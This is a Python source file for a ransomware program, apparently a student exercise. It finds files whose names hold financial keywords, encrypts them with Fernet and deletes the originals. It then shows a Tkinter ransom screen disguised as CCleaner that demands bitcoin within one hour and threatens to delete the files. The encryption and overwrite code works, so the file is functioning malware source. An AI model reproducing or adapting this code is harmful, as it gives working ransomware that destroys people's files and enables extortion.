import os
import string
from tkinter import *
from tkinter import messagebox
from PIL import ImageTk, Image
import time
from cryptography.fernet import Fernet
import random

#Creates a list of files of certain extensions within the given folder, whose file names include keywords from the 'MoneyWords.txt' file in any form
def generate_file_list_keyword(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg','.xlsx')
    file_paths = []
    rfile = open('MoneyWords.txt', 'r')
    words = [line[:-1] for line in rfile]
    for root, dirs, files, in os.walk(path):
        for file in files:
            for w in words:
                file_name,file_ext = os.path.splitext(root+'\\'+file)
                if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
                        file_paths.append(root+'\\'+file)
    print(file_paths)
    return file_paths

#Creates a list of files of certain extensions
def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_name,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    print(file_paths)
    return file_paths

#Creates fernet key
def create_key():
    key = Fernet.generate_key()
    crypter = Fernet(key)
    return crypter, key

#Writes fernet key to text file on the desktop
def write_key(key):
    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want:
        with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt', 'wb') as filekey:
            filekey.write(key)
        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")

#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            data = file.read()
        encrypted = fernet.encrypt(data)
        
        #overwrite the original with the new encrypted version
        os.remove(f)
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet, key):
    if key_entry.get() == key.decode("utf-8"):
        for f in file_paths:
            #create decrypted version of the file
            with open(f, 'rb') as enc_file:
                decrypted = fernet.decrypt(enc_file.read())
        
            #overwrite the original with the new decrypted version
            with open(f, 'wb') as dec_file:
                dec_file.write(decrypted)

# GUI stuff ==========================================================================================================================================================

#Creates and customizes GUI and is the main process
root = Tk()
root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
root.iconbitmap('ccleaner.ico')
root.geometry("1280x720")
root.configure(bg = 'red')
#Global variable to create the number of bitcoins we want user to send
how_many_bitcoins_do_we_want = str(random.randint(1,20))

#Calls functions to create the file paths of all files to encrypt
file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test')
#Creates the Fernet object and the fernet encryption key
crypter, key = create_key()
#Calls function to encrypt all the files in the generated file paths using the 'crypter' Fernet object
encrypt_files(file_paths, crypter)

hour = StringVar()
minute = StringVar()
second = StringVar()

hour.set('01')
minute.set('00')
second.set('00')

hour_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
minute_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)
second_Text_Box = Entry(root, width = 2, font = ('Times New Roman', 54, ''), textvariable = hour)

hour_Text_Box.place(x = 500, y = 310)
minute_Text_Box.place(x = 600, y = 310)
second_Text_Box.place(x = 700, y = 310)

# def runTimer():
#     try:
#         clockTime = int(hour.get() * 3600) + int(minute.get() * 60) + int(second.get())
#     except:
#         print('Incorrect values')

#     while(clockTime > -1):
#         total_Minutes, total_Seconds = divmod(clockTime, 60)

#         total_Hours = 0
#         if total_Minutes > 60:
#             total_Hours, total_Minutes = divmod(total_Minutes, 60)
        
#         hour.set('{0:2d}'.format(total_Hours))
#         minute.set('{0:2d}'.format(total_Minutes))
#         second.set('{0:2d}'.format(total_Seconds))

#         #root.update()
#         #time.sleep(1)

#         if clockTime == 0:
#             messagebox.showinfo('', 'Your time is up. Your files will now be deleted. Have a nice day!')
        
#         clockTime -= 1

#Labels for the skull images around the GUI
skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
image_label1 = Label(image = skull_image, bg = 'red')
image_label2 = Label(image = skull_image, bg = 'red')
image_label3 = Label(image = skull_image, bg = 'red')
image_label4 = Label(image = skull_image, bg = 'red')
image_label1.place(x = 0, y = 0)
image_label2.place(x = 1051, y = 0)
image_label3.place(x = 0, y = 500)
image_label4.place(x = 1051, y = 500)

#Label for the main paragraph text on the GUI
main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one hour.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
main_text.place(x = 217, y = 200)

#Widget for the entry box for input of the amount of bitcoin to send
bitcoin_entry = Entry(root, width = 30, borderwidth = 5)
bitcoin_entry.place(x = 465, y = 428)
bitcoin_entry.insert(0, "Enter Amount of Bitcoin to Send")

#Widget for the button that is pressed after inputting bitcoin amount to entry.
# Runs write_key() function if amount of bitcoin sent is greater than or equal to requested amount.
bitcoin_button = Button(root, text = "Send\nBitCoin", width = 10, height = 2, borderwidth = 5, font = ('Times New Roman', 15), command=lambda:write_key(key))
bitcoin_button.place(x = 685, y = 410)

#Widget for the entry box for input of the Fernet key to decrypt files.
key_entry = Entry(root, width = 50, borderwidth = 5)
key_entry.place(x = 481, y = 500)
key_entry.insert(0, "Enter Key Here")

#Widget for the button that is pressed after inputting Fernet key.
# Runs decrypt_files() function if Fernet key inputted matches the Fernet key generated at run time.
key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18), command = lambda: decrypt_files(file_paths, crypter, key))
key_button.place(x = 546, y = 540)

#Message Box to prevent user from panic closing the program on running, so they don't keep files encrypted forever.
messagebox.showinfo(title = 'READ', message = "IMPORTANT. DO NOT CLOSE PROGRAM WITHOUT READING OR YOU WILL LOSE IMPORTANT FILES.")

# =================================================================================================================================================================

# Also GUI
root.mainloop()